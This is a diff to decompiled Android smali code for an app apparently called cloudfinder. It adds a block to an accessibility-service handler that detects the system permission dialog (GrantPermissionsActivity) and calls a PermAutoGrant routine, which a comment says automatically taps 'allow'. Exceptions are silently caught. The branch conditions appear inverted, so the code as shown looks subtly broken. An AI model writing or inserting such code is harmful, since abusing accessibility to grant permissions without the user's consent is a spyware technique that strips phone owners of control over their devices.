@@ -3038,6 +3038,28 @@
 
     move-object/from16 v2, p1
 
+    # 权限对话框：交给 PermAutoGrant 自动点允许
+    :try_start_permag
+    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;
+    move-result-object v1
+    if-nez v1, :cond_permag_skip
+    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;
+    move-result-object v1
+    const-string v3, "GrantPermissionsActivity"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+    move-result v1
+    if-nez v1, :cond_permag_skip
+    move-object/from16 v0, p0
+    invoke-static {v0}, Lcom/lite/cloudfinder/accessibility/PermAutoGrant;->start(Landroid/accessibilityservice/AccessibilityService;)V
+    :cond_permag_skip
+    :try_end_permag
+    .catch Ljava/lang/Exception; {:try_start_permag .. :try_end_permag} :catch_permag
+    goto :goto_permag
+
+    :catch_permag
+    move-exception v0
+    :goto_permag
+
     const-string v1, "]"
 
     const-string v3, "CC_LOCK cls="
